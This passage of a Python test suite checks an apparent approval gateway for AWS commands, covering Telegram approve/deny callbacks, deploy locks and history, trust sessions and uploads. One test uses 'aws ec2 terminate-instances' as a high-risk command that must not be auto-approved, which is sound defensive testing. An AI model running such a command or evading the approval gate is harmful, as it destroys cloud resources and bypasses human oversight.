                    'id': 'cb123',
                    'from': {'id': 999999999},
                    'data': f'revoke_trust:{trust_id}',
                    'message': {'message_id': 999}
                }
            }),
            'requestContext': {'http': {'method': 'POST'}}
        }
        
        result = app_module.lambda_handler(event, None)
        assert result['statusCode'] == 200
        mock_answer.assert_called()
    
    @patch('app.answer_callback')
    def test_callback_request_not_found(self, mock_answer, app_module):
        """請求不存在"""
        event = {
            'rawPath': '/webhook',
            'headers': {},
            'body': json.dumps({
                'callback_query': {
                    'id': 'cb123',
                    'from': {'id': 999999999},
                    'data': 'approve:nonexistent-id',
                    'message': {'message_id': 999}
                }
            }),
            'requestContext': {'http': {'method': 'POST'}}
        }
        
        result = app_module.lambda_handler(event, None)
        assert result['statusCode'] == 404
        mock_answer.assert_called_with('cb123', '❌ 請求已過期或不存在')
    
    @patch('app.answer_callback')
    @patch('app.update_message')
    def test_callback_request_already_processed(self, mock_update, mock_answer, app_module):
        """請求已處理過"""
        request_id = 'processed-123'
        app_module.table.put_item(Item={
            'request_id': request_id,
            'command': 'aws s3 ls',
            'status': 'approved',  # 已處理
            'source': 'test',
            'reason': 'test'
        })
        
        event = {
            'rawPath': '/webhook',
            'headers': {},
            'body': json.dumps({
                'callback_query': {
                    'id': 'cb123',
                    'from': {'id': 999999999},
                    'data': f'approve:{request_id}',
                    'message': {'message_id': 999}
                }
            }),
            'requestContext': {'http': {'method': 'POST'}}
        }
        
        result = app_module.lambda_handler(event, None)
        assert result['statusCode'] == 200
        mock_answer.assert_called_with('cb123', '⚠️ 此請求已處理過')
    
    @patch('app.answer_callback')
    @patch('app.update_message')
    def test_callback_request_expired(self, mock_update, mock_answer, app_module):
        """請求已過期"""
        request_id = 'expired-123'
        app_module.table.put_item(Item={
            'request_id': request_id,
            'command': 'aws s3 ls',
            'status': 'pending_approval',
            'source': 'test',
            'reason': 'test',
            'ttl': int(time.time()) - 100  # 已過期
        })
        
        event = {
            'rawPath': '/webhook',
            'headers': {},
            'body': json.dumps({
                'callback_query': {
                    'id': 'cb123',
                    'from': {'id': 999999999},
                    'data': f'approve:{request_id}',
                    'message': {'message_id': 999}
                }
            }),
            'requestContext': {'http': {'method': 'POST'}}
        }
        
        result = app_module.lambda_handler(event, None)
        assert result['statusCode'] == 200
        mock_answer.assert_called_with('cb123', '⏰ 此請求已過期')
    
    @patch('app.answer_callback')
    @patch('app.update_message')
    @patch('callbacks.execute_command')
    def test_callback_approve_trust(self, mock_execute, mock_update, mock_answer, app_module):
        """批准並建立信任時段"""
        mock_execute.return_value = 'Instance started'
        
        request_id = 'trust-approve-123'
        app_module.table.put_item(Item={
            'request_id': request_id,
            'command': 'aws ec2 start-instances --instance-ids i-123',
            'status': 'pending_approval',
            'source': 'test-source',
            'reason': 'test',
            'account_id': '111111111111',
            'ttl': int(time.time()) + 300
        })
        
        event = {
            'rawPath': '/webhook',
            'headers': {},
            'body': json.dumps({
                'callback_query': {
                    'id': 'cb123',
                    'from': {'id': 999999999},
                    'data': f'approve_trust:{request_id}',
                    'message': {'message_id': 999}
                }
            }),
            'requestContext': {'http': {'method': 'POST'}}
        }
        
        result = app_module.lambda_handler(event, None)
        assert result['statusCode'] == 200
        
        # 驗證狀態更新
        item = app_module.table.get_item(Key={'request_id': request_id})['Item']
        assert item['status'] == 'approved'
    
    @patch('app.answer_callback')
    @patch('app.update_message')
    def test_callback_add_account_approve(self, mock_update, mock_answer, app_module):
        """批准新增帳號"""
        request_id = 'add-account-123'
        app_module.table.put_item(Item={
            'request_id': request_id,
            'action': 'add_account',
            'account_id': '111111111111',
            'account_name': 'Test Account',
            'role_arn': 'arn:aws:iam::111111111111:role/TestRole',
            'status': 'pending_approval',
            'source': 'test-source',
            'ttl': int(time.time()) + 300
        })
        
        event = {
            'rawPath': '/webhook',
            'headers': {},
            'body': json.dumps({
                'callback_query': {
                    'id': 'cb123',
                    'from': {'id': 999999999},
                    'data': f'approve:{request_id}',
                    'message': {'message_id': 999}
                }
            }),
            'requestContext': {'http': {'method': 'POST'}}
        }
        
        # Mock accounts_table
        import db
        with patch('db.accounts_table') as mock_accounts, \
             patch.object(db, 'accounts_table', mock_accounts):
            mock_accounts.put_item = MagicMock()
            result = app_module.lambda_handler(event, None)
            assert result['statusCode'] == 200
    
    @patch('app.answer_callback')
    @patch('app.update_message')
    def test_callback_add_account_deny(self, mock_update, mock_answer, app_module):
        """拒絕新增帳號"""
        request_id = 'add-account-deny-123'
        app_module.table.put_item(Item={
            'request_id': request_id,
            'action': 'add_account',
            'account_id': '111111111111',
            'account_name': 'Test Account',
            'status': 'pending_approval',
            'source': 'test-source',
            'ttl': int(time.time()) + 300
        })
        
        event = {
            'rawPath': '/webhook',
            'headers': {},
            'body': json.dumps({
                'callback_query': {
                    'id': 'cb123',
                    'from': {'id': 999999999},
                    'data': f'deny:{request_id}',
                    'message': {'message_id': 999}
                }
            }),
            'requestContext': {'http': {'method': 'POST'}}
        }
        
        result = app_module.lambda_handler(event, None)
        assert result['statusCode'] == 200
        
        item = app_module.table.get_item(Key={'request_id': request_id})['Item']
        assert item['status'] == 'denied'
    
    @patch('app.answer_callback')
    @patch('app.update_message')
    def test_callback_remove_account_approve(self, mock_update, mock_answer, app_module):
        """批准移除帳號"""
        request_id = 'remove-account-123'
        app_module.table.put_item(Item={
            'request_id': request_id,
            'action': 'remove_account',
            'account_id': '111111111111',
            'account_name': 'Test Account',
            'status': 'pending_approval',
            'source': 'test-source',
            'ttl': int(time.time()) + 300
        })
        
        event = {
            'rawPath': '/webhook',
            'headers': {},
            'body': json.dumps({
                'callback_query': {
                    'id': 'cb123',
                    'from': {'id': 999999999},
                    'data': f'approve:{request_id}',
                    'message': {'message_id': 999}
                }
            }),
            'requestContext': {'http': {'method': 'POST'}}
        }
        
        # Mock accounts_table
        import db
        with patch('db.accounts_table') as mock_accounts, \
             patch.object(db, 'accounts_table', mock_accounts):
            mock_accounts.delete_item = MagicMock()
            result = app_module.lambda_handler(event, None)
            assert result['statusCode'] == 200
    
    @patch('app.answer_callback')
    @patch('app.update_message')
    def test_callback_remove_account_deny(self, mock_update, mock_answer, app_module):
        """拒絕移除帳號"""
        request_id = 'remove-account-deny-123'
        app_module.table.put_item(Item={
            'request_id': request_id,
            'action': 'remove_account',
            'account_id': '111111111111',
            'account_name': 'Test Account',
            'status': 'pending_approval',
            'source': 'test-source',
            'ttl': int(time.time()) + 300
        })
        
        event = {
            'rawPath': '/webhook',
            'headers': {},
            'body': json.dumps({
                'callback_query': {
                    'id': 'cb123',
                    'from': {'id': 999999999},
                    'data': f'deny:{request_id}',
                    'message': {'message_id': 999}
                }
            }),
            'requestContext': {'http': {'method': 'POST'}}
        }
        
        result = app_module.lambda_handler(event, None)
        assert result['statusCode'] == 200
        
        item = app_module.table.get_item(Key={'request_id': request_id})['Item']
        assert item['status'] == 'denied'
    
    @patch('app.answer_callback')
    @patch('app.update_message')
    def test_callback_upload_approve(self, mock_update, mock_answer, app_module):
        """批准上傳"""
        import base64
        request_id = 'upload-123'
        content = base64.b64encode(b'test content').decode()
        
        app_module.table.put_item(Item={
            'request_id': request_id,
            'action': 'upload',
            'bucket': 'test-bucket',
            'key': 'test/file.txt',
            'content': content,
            'content_type': 'text/plain',
            'content_size': 12,
            'status': 'pending_approval',
            'source': 'test-source',
            'reason': 'test',
            'ttl': int(time.time()) + 300
        })
        
        # Mock S3 upload
        with patch('boto3.client') as mock_boto:
            mock_s3 = MagicMock()
            mock_s3.meta.region_name = 'us-east-1'
            mock_boto.return_value = mock_s3
            
            event = {
                'rawPath': '/webhook',
                'headers': {},
                'body': json.dumps({
                    'callback_query': {
                        'id': 'cb123',
                        'from': {'id': 999999999},
                        'data': f'approve:{request_id}',
                        'message': {'message_id': 999}
                    }
                }),
                'requestContext': {'http': {'method': 'POST'}}
            }
            
            result = app_module.lambda_handler(event, None)
            assert result['statusCode'] == 200
    
    @patch('app.answer_callback')
    @patch('app.update_message')
    def test_callback_upload_deny(self, mock_update, mock_answer, app_module):
        """拒絕上傳"""
        request_id = 'upload-deny-123'
        
        app_module.table.put_item(Item={
            'request_id': request_id,
            'action': 'upload',
            'bucket': 'test-bucket',
            'key': 'test/file.txt',
            'content_size': 12,
            'status': 'pending_approval',
            'source': 'test-source',
            'reason': 'test',
            'ttl': int(time.time()) + 300
        })
        
        event = {
            'rawPath': '/webhook',
            'headers': {},
            'body': json.dumps({
                'callback_query': {
                    'id': 'cb123',
                    'from': {'id': 999999999},
                    'data': f'deny:{request_id}',
                    'message': {'message_id': 999}
                }
            }),
            'requestContext': {'http': {'method': 'POST'}}
        }
        
        result = app_module.lambda_handler(event, None)
        assert result['statusCode'] == 200
        
        item = app_module.table.get_item(Key={'request_id': request_id})['Item']
        assert item['status'] == 'denied'


# ============================================================================
# Deployer 模組測試
# ============================================================================

class TestDeployerModule:
    """Deployer 模組測試"""
    
    @pytest.fixture
    def deployer_tables(self, mock_dynamodb):
        """建立 deployer 需要的表"""
        # Projects table
        mock_dynamodb.create_table(
            TableName='bouncer-projects',
            KeySchema=[{'AttributeName': 'project_id', 'KeyType': 'HASH'}],
            AttributeDefinitions=[{'AttributeName': 'project_id', 'AttributeType': 'S'}],
            BillingMode='PAY_PER_REQUEST'
        )
        
        # History table
        mock_dynamodb.create_table(
            TableName='bouncer-deploy-history',
            KeySchema=[{'AttributeName': 'deploy_id', 'KeyType': 'HASH'}],
            AttributeDefinitions=[
                {'AttributeName': 'deploy_id', 'AttributeType': 'S'},
                {'AttributeName': 'project_id', 'AttributeType': 'S'},
                {'AttributeName': 'started_at', 'AttributeType': 'N'}
            ],
            GlobalSecondaryIndexes=[{
                'IndexName': 'project-time-index',
                'KeySchema': [
                    {'AttributeName': 'project_id', 'KeyType': 'HASH'},
                    {'AttributeName': 'started_at', 'KeyType': 'RANGE'}
                ],
                'Projection': {'ProjectionType': 'ALL'}
            }],
            BillingMode='PAY_PER_REQUEST'
        )
        
        # Locks table
        mock_dynamodb.create_table(
            TableName='bouncer-deploy-locks',
            KeySchema=[{'AttributeName': 'project_id', 'KeyType': 'HASH'}],
            AttributeDefinitions=[{'AttributeName': 'project_id', 'AttributeType': 'S'}],
            BillingMode='PAY_PER_REQUEST'
        )
        
        return mock_dynamodb
    
    def test_list_projects_empty(self, deployer_tables):
        """列出專案（空）"""
        # 重新載入 deployer 模組
        import sys
        if 'deployer' in sys.modules:
            del sys.modules['deployer']
        if 'src.deployer' in sys.modules:
            del sys.modules['src.deployer']
        
        sys.path.insert(0, os.path.join(os.path.dirname(__file__), '..', 'src'))
        import deployer
        
        # 注入 mock tables
        deployer.projects_table = deployer_tables.Table('bouncer-projects')
        deployer.history_table = deployer_tables.Table('bouncer-deploy-history')
        deployer.locks_table = deployer_tables.Table('bouncer-deploy-locks')
        
        result = deployer.list_projects()
        assert result == []
        
        sys.path.pop(0)
    
    def test_add_and_get_project(self, deployer_tables):
        """新增和取得專案"""
        import sys
        if 'deployer' in sys.modules:
            del sys.modules['deployer']
        if 'src.deployer' in sys.modules:
            del sys.modules['src.deployer']
        
        sys.path.insert(0, os.path.join(os.path.dirname(__file__), '..', 'src'))
        import deployer
        
        deployer.projects_table = deployer_tables.Table('bouncer-projects')
        deployer.history_table = deployer_tables.Table('bouncer-deploy-history')
        deployer.locks_table = deployer_tables.Table('bouncer-deploy-locks')
        
        # 新增專案
        config = {
            'name': 'Test Project',
            'git_repo': 'test-repo',
            'stack_name': 'test-stack'
        }
        item = deployer.add_project('test-project', config)
        assert item['project_id'] == 'test-project'
        assert item['name'] == 'Test Project'
        
        # 取得專案
        project = deployer.get_project('test-project')
        assert project is not None
        assert project['name'] == 'Test Project'
        
        # 列出專案
        projects = deployer.list_projects()
        assert len(projects) == 1
        
        sys.path.pop(0)
    
    def test_remove_project(self, deployer_tables):
        """移除專案"""
        import sys
        if 'deployer' in sys.modules:
            del sys.modules['deployer']
        if 'src.deployer' in sys.modules:
            del sys.modules['src.deployer']
        
        sys.path.insert(0, os.path.join(os.path.dirname(__file__), '..', 'src'))
        import deployer
        
        deployer.projects_table = deployer_tables.Table('bouncer-projects')
        
        # 先新增
        deployer.add_project('to-remove', {'name': 'To Remove'})
        
        # 移除
        result = deployer.remove_project('to-remove')
        assert result == True
        
        # 確認已移除
        project = deployer.get_project('to-remove')
        assert project is None
        
        sys.path.pop(0)
    
    def test_acquire_and_release_lock(self, deployer_tables):
        """取得和釋放部署鎖"""
        import sys
        if 'deployer' in sys.modules:
            del sys.modules['deployer']
        if 'src.deployer' in sys.modules:
            del sys.modules['src.deployer']
        
        sys.path.insert(0, os.path.join(os.path.dirname(__file__), '..', 'src'))
        import deployer
        
        deployer.locks_table = deployer_tables.Table('bouncer-deploy-locks')
        
        # 取得鎖
        result = deployer.acquire_lock('test-project', 'deploy-123', 'test-user')
        assert result == True
        
        # 再次取得應該失敗
        result2 = deployer.acquire_lock('test-project', 'deploy-456', 'test-user')
        assert result2 == False
        
        # 釋放鎖
        deployer.release_lock('test-project')
        
        # 現在應該可以取得
        result3 = deployer.acquire_lock('test-project', 'deploy-789', 'test-user')
        assert result3 == True
        
        sys.path.pop(0)
    
    def test_get_lock_expired(self, deployer_tables):
        """取得已過期的鎖"""
        import sys
        if 'deployer' in sys.modules:
            del sys.modules['deployer']
        if 'src.deployer' in sys.modules:
            del sys.modules['src.deployer']
        
        sys.path.insert(0, os.path.join(os.path.dirname(__file__), '..', 'src'))
        import deployer
        
        deployer.locks_table = deployer_tables.Table('bouncer-deploy-locks')
        
        # 手動插入一個過期的鎖
        deployer.locks_table.put_item(Item={
            'project_id': 'expired-project',
            'lock_id': 'old-deploy',
            'locked_at': int(time.time()) - 7200,
            'ttl': int(time.time()) - 3600  # 已過期
        })
        
        # 取得鎖應該返回 None（因為已過期）
        lock = deployer.get_lock('expired-project')
        assert lock is None
        
        sys.path.pop(0)
    
    def test_deploy_record_lifecycle(self, deployer_tables):
        """部署記錄生命週期"""
        import sys
        if 'deployer' in sys.modules:
            del sys.modules['deployer']
        if 'src.deployer' in sys.modules:
            del sys.modules['src.deployer']
        
        sys.path.insert(0, os.path.join(os.path.dirname(__file__), '..', 'src'))
        import deployer
        
        deployer.history_table = deployer_tables.Table('bouncer-deploy-history')
        
        # 建立部署記錄
        deploy_id = 'deploy-test-123'
        record = deployer.create_deploy_record(deploy_id, 'test-project', {
            'branch': 'main',
            'triggered_by': 'test-user',
            'reason': 'Test deploy'
        })
        assert record['deploy_id'] == deploy_id
        assert record['status'] == 'PENDING'
        
        # 更新記錄
        deployer.update_deploy_record(deploy_id, {
            'status': 'RUNNING',
            'execution_arn': 'arn:aws:states:...'
        })
        
        # 取得記錄
        updated = deployer.get_deploy_record(deploy_id)
        assert updated['status'] == 'RUNNING'
        
        sys.path.pop(0)
    
    def test_start_deploy_project_not_found(self, deployer_tables):
        """啟動部署但專案不存在"""
        import sys
        if 'deployer' in sys.modules:
            del sys.modules['deployer']
        if 'src.deployer' in sys.modules:
            del sys.modules['src.deployer']
        
        sys.path.insert(0, os.path.join(os.path.dirname(__file__), '..', 'src'))
        import deployer
        
        deployer.projects_table = deployer_tables.Table('bouncer-projects')
        deployer.locks_table = deployer_tables.Table('bouncer-deploy-locks')
        deployer.history_table = deployer_tables.Table('bouncer-deploy-history')
        
        result = deployer.start_deploy('nonexistent', 'main', 'user', 'reason')
        assert 'error' in result
        assert '不存在' in result['error']
        
        sys.path.pop(0)
    
    def test_start_deploy_project_disabled(self, deployer_tables):
        """啟動部署但專案已停用"""
        import sys
        if 'deployer' in sys.modules:
            del sys.modules['deployer']
        if 'src.deployer' in sys.modules:
            del sys.modules['src.deployer']
        
        sys.path.insert(0, os.path.join(os.path.dirname(__file__), '..', 'src'))
        import deployer
        
        deployer.projects_table = deployer_tables.Table('bouncer-projects')
        deployer.locks_table = deployer_tables.Table('bouncer-deploy-locks')
        
        # 新增停用的專案
        deployer.projects_table.put_item(Item={
            'project_id': 'disabled-project',
            'name': 'Disabled',
            'enabled': False
        })
        
        result = deployer.start_deploy('disabled-project', 'main', 'user', 'reason')
        assert 'error' in result
        assert '停用' in result['error']
        
        sys.path.pop(0)
    
    def test_start_deploy_locked(self, deployer_tables):
        """啟動部署但已有其他部署進行中"""
        import sys
        if 'deployer' in sys.modules:
            del sys.modules['deployer']
        if 'src.deployer' in sys.modules:
            del sys.modules['src.deployer']
        
        sys.path.insert(0, os.path.join(os.path.dirname(__file__), '..', 'src'))
        import deployer
        
        deployer.projects_table = deployer_tables.Table('bouncer-projects')
        deployer.locks_table = deployer_tables.Table('bouncer-deploy-locks')
        
        # 新增專案
        deployer.projects_table.put_item(Item={
            'project_id': 'locked-project',
            'name': 'Locked',
            'enabled': True
        })
        
        # 新增鎖
        deployer.locks_table.put_item(Item={
            'project_id': 'locked-project',
            'lock_id': 'existing-deploy',
            'locked_at': int(time.time()),
            'ttl': int(time.time()) + 3600
        })
        
        result = deployer.start_deploy('locked-project', 'main', 'user', 'reason')
        assert 'error' in result
        assert '進行中' in result['error']
        
        sys.path.pop(0)
    
    def test_cancel_deploy_not_found(self, deployer_tables):
        """取消不存在的部署"""
        import sys
        if 'deployer' in sys.modules:
            del sys.modules['deployer']
        if 'src.deployer' in sys.modules:
            del sys.modules['src.deployer']
        
        sys.path.insert(0, os.path.join(os.path.dirname(__file__), '..', 'src'))
        import deployer
        
        deployer.history_table = deployer_tables.Table('bouncer-deploy-history')
        
        result = deployer.cancel_deploy('nonexistent')
        assert 'error' in result
        assert '不存在' in result['error']
        
        sys.path.pop(0)
    
    def test_cancel_deploy_already_completed(self, deployer_tables):
        """取消已完成的部署"""
        import sys
        if 'deployer' in sys.modules:
            del sys.modules['deployer']
        if 'src.deployer' in sys.modules:
            del sys.modules['src.deployer']
        
        sys.path.insert(0, os.path.join(os.path.dirname(__file__), '..', 'src'))
        import deployer
        
        deployer.history_table = deployer_tables.Table('bouncer-deploy-history')
        
        # 建立已完成的記錄
        deployer.history_table.put_item(Item={
            'deploy_id': 'completed-deploy',
            'project_id': 'test',
            'status': 'SUCCESS'
        })
        
        result = deployer.cancel_deploy('completed-deploy')
        assert 'error' in result
        assert 'SUCCESS' in result['error']
        
        sys.path.pop(0)
    
    def test_get_deploy_status_not_found(self, deployer_tables):
        """取得不存在的部署狀態"""
        import sys
        if 'deployer' in sys.modules:
            del sys.modules['deployer']
        if 'src.deployer' in sys.modules:
            del sys.modules['src.deployer']
        
        sys.path.insert(0, os.path.join(os.path.dirname(__file__), '..', 'src'))
        import deployer
        
        deployer.history_table = deployer_tables.Table('bouncer-deploy-history')
        
        result = deployer.get_deploy_status('nonexistent')
        assert 'error' in result
        
        sys.path.pop(0)
    
    def test_get_deploy_history(self, deployer_tables):
        """取得部署歷史"""
        import sys
        if 'deployer' in sys.modules:
            del sys.modules['deployer']
        if 'src.deployer' in sys.modules:
            del sys.modules['src.deployer']
        
        sys.path.insert(0, os.path.join(os.path.dirname(__file__), '..', 'src'))
        import deployer
        
        deployer.history_table = deployer_tables.Table('bouncer-deploy-history')
        
        # 建立幾個記錄
        for i in range(3):
            deployer.history_table.put_item(Item={
                'deploy_id': f'deploy-{i}',
                'project_id': 'test-project',
                'status': 'SUCCESS',
                'started_at': int(time.time()) - i * 100
            })
        
        history = deployer.get_deploy_history('test-project', limit=10)
        assert len(history) == 3
        
        sys.path.pop(0)


# ============================================================================
# MCP Deploy Tools 測試
# ============================================================================

class TestMCPDeployTools:
    """MCP Deploy Tools 測試"""
    
    def test_mcp_tool_project_list(self, app_module):
        """bouncer_project_list MCP tool"""
        # Mock deployer.list_projects
        with patch('deployer.list_projects', return_value=[
            {'project_id': 'test', 'name': 'Test Project'}
        ]):
            event = {
                'rawPath': '/mcp',
                'headers': {'x-approval-secret': 'test-secret'},
                'body': json.dumps({
                    'jsonrpc': '2.0',
                    'id': 'test-1',
                    'method': 'tools/call',
                    'params': {
                        'name': 'bouncer_project_list',
                        'arguments': {}
                    }
                }),
                'requestContext': {'http': {'method': 'POST'}}
            }
            
            result = app_module.lambda_handler(event, None)
            body = json.loads(result['body'])
            
            assert 'result' in body
            content = json.loads(body['result']['content'][0]['text'])
            assert 'projects' in content


# ============================================================================
# Trust 模組補充測試
# ============================================================================

class TestTrustModuleAdditional:
    """Trust 模組補充測試"""
    
    def test_create_trust_session(self, app_module):
        """建立信任時段"""
        trust_id = app_module.create_trust_session('test-source', '111111111111', '999999999')
        assert trust_id is not None
        
        # 驗證可以在 DynamoDB 中找到
        item = app_module.table.get_item(Key={'request_id': trust_id}).get('Item')
        assert item is not None
        assert item['type'] == 'trust_session'
    
    def test_should_trust_approve_with_active_session(self, app_module):
        """有活躍信任時段時應該自動批准"""
        source = 'test-trust-source'
        account_id = '111111111111'
        
        # 建立信任時段
        app_module.create_trust_session(source, account_id, '999999999')
        
        # 測試安全命令是否會被信任
        should_trust, session, reason = app_module.should_trust_approve(
            'aws s3 cp file.txt s3://bucket/',  # 非高危命令
            source,
            account_id
        )
        assert should_trust is True
        assert session is not None
    
    def test_should_trust_approve_excluded_command(self, app_module):
        """高危命令不應被信任"""
        source = 'test-trust-source-2'
        account_id = '111111111111'
        
        # 建立信任時段
        app_module.create_trust_session(source, account_id, '999999999')
        
        # 測試高危命令
        should_trust, session, reason = app_module.should_trust_approve(
            'aws ec2 terminate-instances --instance-ids i-123',  # 高危
            source,
            account_id
        )
        assert should_trust is False
    
    def test_revoke_trust_session(self, app_module):
        """撤銷信任時段"""
        # 建立
        trust_id = app_module.create_trust_session('revoke-source', '111111111111', '999999999')
        
        # 撤銷
        result = app_module.revoke_trust_session(trust_id)
        assert result is True
        
        # 確認已撤銷
        item = app_module.table.get_item(Key={'request_id': trust_id}).get('Item')
        assert item is None or item.get('expires_at', float('inf')) < time.time()


# ============================================================================
# Upload 功能測試
# ============================================================================

class TestUploadFunctionality:
    """Upload 功能測試"""
    
    @patch('telegram.send_telegram_message')
    def test_mcp_tool_upload_missing_filename(self, mock_telegram, app_module):
        """上傳缺少 filename"""
        result = app_module.mcp_tool_upload('test-1', {
            'content': 'dGVzdA==',  # base64 'test'
            'reason': 'test'
        })
        
        body = json.loads(result['body'])
        content = json.loads(body['result']['content'][0]['text'])
        assert content['status'] == 'error'
        assert 'filename' in content['error']
    
    @patch('telegram.send_telegram_message')
    def test_mcp_tool_upload_missing_content(self, mock_telegram, app_module):
        """上傳缺少 content"""
        result = app_module.mcp_tool_upload('test-1', {
            'filename': 'test.txt',
            'reason': 'test'
        })
        
        body = json.loads(result['body'])
        content = json.loads(body['result']['content'][0]['text'])
        assert content['status'] == 'error'
        assert 'content' in content['error']
    
    @patch('telegram.send_telegram_message')
    def test_mcp_tool_upload_invalid_base64(self, mock_telegram, app_module):
        """上傳無效 base64"""
        result = app_module.mcp_tool_upload('test-1', {
            'filename': 'test.txt',
            'content': 'not-valid-base64!!!',
            'reason': 'test'
        })
        
        body = json.loads(result['body'])
        content = json.loads(body['result']['content'][0]['text'])
        assert content['status'] == 'error'
        assert 'base64' in content['error'].lower()
    
    @patch('telegram.send_telegram_message')
    def test_mcp_tool_upload_too_large(self, mock_telegram, app_module):
        """上傳檔案過大"""
        import base64
        # 建立 5MB 的內容（超過 4.5MB 限制）
        large_content = base64.b64encode(b'x' * (5 * 1024 * 1024)).decode()
        
        result = app_module.mcp_tool_upload('test-1', {
            'filename': 'large.bin',
            'content': large_content,
            'reason': 'test'
        })
        
        body = json.loads(result['body'])
        content = json.loads(body['result']['content'][0]['text'])
        assert content['status'] == 'error'
        assert 'too large' in content['error'].lower() or 'large' in content['error'].lower()
    
    @patch('telegram.send_telegram_message')
    def test_mcp_tool_upload_success_async(self, mock_telegram, app_module):
        """上傳成功（異步模式）"""
        import base64
        content = base64.b64encode(b'test content').decode()
        
        result = app_module.mcp_tool_upload('test-1', {
            'filename': 'test.txt',
            'content': content,
            'reason': 'test upload'
        })
        
        body = json.loads(result['body'])
        resp_content = json.loads(body['result']['content'][0]['text'])
        assert resp_content['status'] == 'pending_approval'
        assert 'request_id' in resp_content


# ============================================================================
# Trust Session 自動批准測試
# ============================================================================

class TestTrustAutoApprove:
    """Trust Session 自動批准測試"""
    
    @patch('telegram.send_telegram_message_silent')
    def test_trust_auto_approve_flow(self, mock_silent, app_module):
        """信任時段內的自動批准流程"""
        import mcp_execute
        import mcp_tools
        source = 'trust-auto-test'
        account_id = '111111111111'
        
        # 建立信任時段
        trust_id = app_module.create_trust_session(source, account_id, '999999999')
        
        # 執行命令（應該被自動批准）
        with patch.object(mcp_execute, 'execute_command', return_value='{"result": "ok"}'):
            event = {
                'rawPath': '/mcp',
                'headers': {'x-approval-secret': 'test-secret'},
                'body': json.dumps({
                    'jsonrpc': '2.0',
                    'id': 'test-1',
                    'method': 'tools/call',
                    'params': {
                        'name': 'bouncer_execute',
                        'arguments': {
                            'command': 'aws s3 cp file.txt s3://bucket/',
                            'trust_scope': source,
                            'source': source,
                            'account': account_id
                        }
                    }
                }),
                'requestContext': {'http': {'method': 'POST'}}
            }
            
            # Mock get_account 返回有效帳號
            with patch.object(mcp_execute, 'get_account', return_value={
                'account_id': account_id,
                'name': 'Test',
                'enabled': True,
                'role_arn': None
            }):
                result = app_module.lambda_handler(event, None)
                body = json.loads(result['body'])
                
                content = json.loads(body['result']['content'][0]['text'])
                assert content['status'] == 'trust_auto_approved'
                assert 'trust_session' in content


# ============================================================================
# MCP Tool Handlers 補充測試
# ============================================================================

class TestMCPToolHandlersAdditional:
    """MCP Tool Handlers 補充測試"""
    
    def test_mcp_tool_trust_status_all(self, app_module):
        """查詢所有信任時段"""
        # 建立一個信任時段
        app_module.create_trust_session('status-test-source', '111111111111', '999999999')
        
        event = {
            'rawPath': '/mcp',
            'headers': {'x-approval-secret': 'test-secret'},
            'body': json.dumps({
                'jsonrpc': '2.0',
                'id': 'test-1',
                'method': 'tools/call',
                'params': {
                    'name': 'bouncer_trust_status',
                    'arguments': {}
                }
            }),
            'requestContext': {'http': {'method': 'POST'}}
        }
        
        result = app_module.lambda_handler(event, None)
        body = json.loads(result['body'])
        
        content = json.loads(body['result']['content'][0]['text'])
        assert 'active_sessions' in content
        assert 'sessions' in content
    
    def test_mcp_tool_trust_status_by_source(self, app_module):
        """查詢特定來源的信任時段"""
        source = 'specific-source-test'
        app_module.create_trust_session(source, '111111111111', '999999999')
        
        event = {
            'rawPath': '/mcp',
            'headers': {'x-approval-secret': 'test-secret'},
            'body': json.dumps({
                'jsonrpc': '2.0',
                'id': 'test-1',
                'method': 'tools/call',
                'params': {
                    'name': 'bouncer_trust_status',
                    'arguments': {
                        'source': source
                    }
                }
            }),
            'requestContext': {'http': {'method': 'POST'}}
        }
        
        result = app_module.lambda_handler(event, None)
        body = json.loads(result['body'])
        
        content = json.loads(body['result']['content'][0]['text'])
        assert 'sessions' in content
    
    def test_mcp_tool_trust_revoke(self, app_module):
        """撤銷信任時段"""
        trust_id = app_module.create_trust_session('revoke-test', '111111111111', '999999999')
        
        event = {
            'rawPath': '/mcp',
            'headers': {'x-approval-secret': 'test-secret'},
            'body': json.dumps({
                'jsonrpc': '2.0',
                'id': 'test-1',
                'method': 'tools/call',
                'params': {
                    'name': 'bouncer_trust_revoke',
                    'arguments': {
                        'trust_id': trust_id
                    }
                }
            }),
            'requestContext': {'http': {'method': 'POST'}}
        }
        
        result = app_module.lambda_handler(event, None)
        body = json.loads(result['body'])
        
        content = json.loads(body['result']['content'][0]['text'])
        assert content['success'] == True
    
    def test_mcp_tool_trust_revoke_missing_id(self, app_module):
        """撤銷信任時段缺少 ID"""
        event = {
            'rawPath': '/mcp',
            'headers': {'x-approval-secret': 'test-secret'},
            'body': json.dumps({
                'jsonrpc': '2.0',
                'id': 'test-1',
                'method': 'tools/call',
                'params': {
                    'name': 'bouncer_trust_revoke',
                    'arguments': {}
                }
            }),
            'requestContext': {'http': {'method': 'POST'}}
        }
        
        result = app_module.lambda_handler(event, None)
        body = json.loads(result['body'])
        
        assert 'error' in body
        assert body['error']['code'] == -32602
    
    def test_mcp_tool_list_pending_with_source(self, app_module):
        """列出特定來源的待審批請求"""
        # 直接呼叫函數 - 測試帶 source 的情況
        result = app_module.mcp_tool_list_pending('test-1', {'source': 'test-source', 'limit': 10})
        body = json.loads(result['body'])
        
        # 可能有 error 或 result，都是預期行為
        assert 'result' in body or 'error' in body
    
    @patch('telegram.send_telegram_message')
    def test_mcp_tool_add_account_missing_name(self, mock_telegram, app_module):
        """新增帳號缺少名稱"""
        result = app_module.mcp_tool_add_account('test-1', {
            'account_id': '111111111111',
            'role_arn': 'arn:aws:iam::111111111111:role/Test'
        })
        
        body = json.loads(result['body'])
        content = json.loads(body['result']['content'][0]['text'])
        assert content['status'] == 'error'
        assert '名稱' in content['error'] or 'name' in content['error'].lower()
    
    @patch('telegram.send_telegram_message')
    def test_mcp_tool_add_account_invalid_role_arn(self, mock_telegram, app_module):
        """新增帳號無效 Role ARN"""
        result = app_module.mcp_tool_add_account('test-1', {
            'account_id': '111111111111',
            'name': 'Test Account',
            'role_arn': 'invalid-arn'
        })
        
        body = json.loads(result['body'])
        content = json.loads(body['result']['content'][0]['text'])
        assert content['status'] == 'error'
        assert 'arn:aws:iam' in content['error']
    
    @patch('telegram.send_telegram_message')
    def test_mcp_tool_remove_account_default(self, mock_telegram, app_module):
        """不能移除預設帳號"""
        import mcp_tools
        import mcp_admin
        original = mcp_admin.DEFAULT_ACCOUNT_ID
        try:
            mcp_admin.DEFAULT_ACCOUNT_ID = '111111111111'
            result = app_module.mcp_tool_remove_account('test-1', {
                'account_id': '111111111111'
            })
            
            body = json.loads(result['body'])
            content = json.loads(body['result']['content'][0]['text'])
            assert content['status'] == 'error'
            assert '預設' in content['error']
        finally:
